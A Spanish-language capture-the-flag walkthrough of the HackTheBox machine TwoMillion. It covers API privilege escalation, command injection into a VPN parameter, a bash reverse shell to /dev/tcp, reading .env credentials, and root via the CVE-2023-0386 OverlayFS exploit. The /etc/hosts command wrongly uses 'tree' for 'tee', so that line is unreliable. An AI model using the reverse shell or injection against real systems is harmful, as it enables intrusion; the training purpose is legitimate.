---
layout: default
title: TwoMillion
parent: HackTheBox
---
# TwoMillion
{: .no_toc }

## Contenidos
{: .no_toc .text-delta}

1. TOC
{:toc}

---
{:.lead}

## Begin
![](/assets/img/HTB_TwoMillion/TM0.png)
Esta maquina es un tanto interesante, pese a ser easy... Tiene unos conceptos de explotacion de Kernel llamativo.

**Lista de lo que veremos en esta machine:**

* Reconocimiento de puertos
* Explotacion de vulnerabilidades del kernel
* Javascript functions
* RCE vulnerando la API

## Reconocimiento

Usamos los scripts de **reconocimiento** con la herramienta **nmap**:

```bash
sudo nmap -sS -p- 65535 --open --min-rate 5000 -vvv -n -Pn <IP>
```
O tambien podemos usar:
```bash
nmap -T5 <IP de la Maquina>
```
Y para agilizar trabajo, usaremos los puertos descubiertos para obtener informacion de los servicios y versiones que estan tras estos:

![](/assets/img/HTB_TwoMillion/TM1.png)

Podemos ver solo 2 servicios expuestos:

* 22 Perteneciente a un OpenSSH de un sistema **Ubuntu**
* 80 Perteneciente a HTTP

Si le tiramos una herramienta de reconocimiento web, veremos que no la IP nos hace un **redirect** a un host, que vamos a tener que agregarlo al **/etc/hosts**
Lo podemos hacer de manera rapida con un:

```bash
echo "<IP> 2million.htb" | tree -a /etc/hosts
```
![](/assets/img/HTB_TwoMillion/TM2.png)

Al ir a la pagina, podremos ver una interfaz... Interesante:

![](/assets/img/HTB_TwoMillion/TM3.png)

Lo que nos llama la atencion aqui, es que:

* Hay un panel de **LOGIN**
* Hay un panel de **JOIN**, que seria el equivalente a un registro.

Si vamos al panel de **JOIN**, veremos lo siguiente:

![](/assets/img/HTB_TwoMillion/TM4.png)

## Intrusion

Si damos un **CTL+U**, podremos ver el codigo fuente de la pagina... Y nos toparemos con algo interesante:

![](/assets/img/HTB_TwoMillion/TM5.png)

Si vemos la funcion **inviteapi.min.js**, veremos lo siguiente:

![](/assets/img/HTB_TwoMillion/TM6.png)

Vemos la linea interesante de:

```javascript
|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify
```
Asi que podemos interactuar con la consola usando **verifyInviteCode** y tambien **makeInviteCode**:

![](/assets/img/HTB_TwoMillion/TM7.png)

Vemos que esta encriptado en **ROT13** o cifrado CESAR.
* Resumiendo el cifrado **CESAR**, tomas las letras del alfabeto, les asigna una posicion **numerica**  y las va rotando de acuerdo a su posicion, ejemplificando rapido... Si tenemos una ROT13, y queremos encriptar un **"HOLA"**, aplicando del cifrado **CESAR**, tendremos como resultado un: **"UBYN"**

Bueno, si la desciframos obtendremos:

![](/assets/img/HTB_TwoMillion/TM8.png)

Lo que nos pide que hagamos una peticion por el metodo **POST** a la direccion: **/api/v1/invite/generate**

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

Si lo hacemos, obtendemos un codigo en **base64**, por lo que debemos desencriptarlo y obtendemos el codigo de invitacion:

![](/assets/img/HTB_TwoMillion/TM9.png)

![](/assets/img/HTB_TwoMillion/TM10.png)

Solo nos queda registarnos y logearnos en la pagina:

![](/assets/img/HTB_TwoMillion/TM11.png)

Una vez dentro veremos:

![](/assets/img/HTB_TwoMillion/TM12.png)

Lo que nos interesa es el apartado de **ACCESS**, esto se debe a que aqui es donde creamos y descargamos nuestra **VPN**, pero no olvidemos que se aplica una query a la API del servicio.

Abrimos **BURPSUITE** e interceptamos la peticion:

![](/assets/img/HTB_TwoMillion/TM13.png)

Vemos que le hace un **GET** a la API, pero queremos enumerar consultas interesantes, asi que vamos directamente a la API, tirando el **GET** a la ruta: **"/api/v1"**

![](/assets/img/HTB_TwoMillion/TM14.png)

Vemos algunos metodos interesante, en especial los de tipo **admin**, por lo que vamos a aprovecharnos de eso:

![](/assets/img/HTB_TwoMillion/TM15.png)

Al atentar contra la ruta: **"/api/v1/admin/settings/update"**, vemos que el mensaje es "Invalid CONTENT TYPE", por lo que nos da indicios que deberiamos pasar parametros, asi que indicamos un **Content-Type: application/json**:

![](/assets/img/HTB_TwoMillion/TM16.png)

Veremos que ahora nos pide un parametro: **email**, por lo que lo introduciremos a nuestro cuerpo JSON.

![](/assets/img/HTB_TwoMillion/TM17.png)

Y ahora nos pide el parametro: **is_admin**, por lo que podemos decir que es una variable tipo Booleana, es decir: **1 or 0**, o tambien **TRUE o FALSE**

![](/assets/img/HTB_TwoMillion/TM18.png)
![](/assets/img/HTB_TwoMillion/TM19.png)
Ahora vemos que nos hemos vuelto administradores, por lo que atentaremos contra la ruta de generar VPN pero del administrador:

![](/assets/img/HTB_TwoMillion/TM20.png)

Ahora tendremos que ver una forma de escapar comandos, por lo que podemos intentar poner un ";" y un "#" al final del parametro, esto debido a que el ";" creara una escapada de comando, y el "#" a comentar el resto de la peticion:

![](/assets/img/HTB_TwoMillion/TM21.png)

Como podemos ver, ahora tenemos ejecucion remota de comandos (RCE), por lo que queda ganar acceso a la maquina.

No olvidemos la reverse shell basica en **bash**:

```bash
bash -c 'bash -i >&/dev/tcp/<TU IP>/<TU PUERTO> 0>&1'
```
![](/assets/img/HTB_TwoMillion/TM22.png)

Vemos que ganamos acceso como el usuario **"www-data"**, por lo que nos queda escalar privilegios al usuario y luego al root.

Si vemos, estamos dentro del directorio de la pagina web, listamos todos los archivos, vemos un listado interesante:

* Database.php
* Router.php
* index.php

Pero si los leemos, nos daremos cuenta, que llama a una variable privada, por lo que nos vamos a poner a analizar todos esos archivos:

![](/assets/img/HTB_TwoMillion/TM23.png)

Nos vamos a topar algo interesante dentro del archivo **index**, en lo que parece ser un **archivo de entorno php**, si deseas leer mas de esto, dale [click aqui](https://desarrolloweb.com/articulos/variables-entorno-php-env.html), el caso:

![](/assets/img/HTB_TwoMillion/TM24.png)

Vemos lo siguiente:

```php
$envFile = file('.env');
$envVariables = [];
foreach ($envFile as $line) {
        $envVariables[$key] = $value;
$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];
```
Por lo que podemos deducir, que hay un archivo oculto, asi que vemos archivos ocultos y sorpresa:

![](/assets/img/HTB_TwoMillion/TM25.png)

Por lo que ya tenemos las credenciales del **USUARIO NO PRIVILEGIADO**

## Escalada de Privilegios (PRIVESC)

![](/assets/img/HTB_TwoMillion/TM26.png)

Una vez como el usuario "admin", nos tocara investigar cositas... Pero ahorrando trabajo, no tenemos permisos a nivel de **SUDOERS**, pero podemos ver algo interesante:

![](/assets/img/HTB_TwoMillion/TM27.png)

Vemos que estamos contra un Kernel un tanto curioso... Si hacemos una busqueda rapida por **Google**, nos toparemos con unos CVE que nos indican una escalada de privilegios:

![](/assets/img/HTB_TwoMillion/TM28.png)

* Aqui tenemos el link de actualizacion de seguridad de [UBUNTU](https://ubuntu.com/security/notices/LSN-0095-1)
* Aqui: [Link del CVE Usado](https://github.com/sxlmnwb/CVE-2023-0386) 

Bueno, mostrado esto:
### CVE-2023-0386
Explicado de manera resumida, aprovecha la mala implementacion de un complemento: **"OverlayFS"**, este permite lectura y escritura dentro de un arbol de directorios.

Lo traeremos a la maquina victima, dentro del directorio **/tmp** y lo ejecutaremos como indica en su repo de GitHub:

```bash
make all; ./fuse ./ovlcap/lower ./gc
```
Y en otra terminal, corremos el ./exp y ya tendremos acceso como **ROOT**, por lo que podemos decir... Maquina superada.

![](/assets/img/HTB_TwoMillion/TM29.png)

## FIN
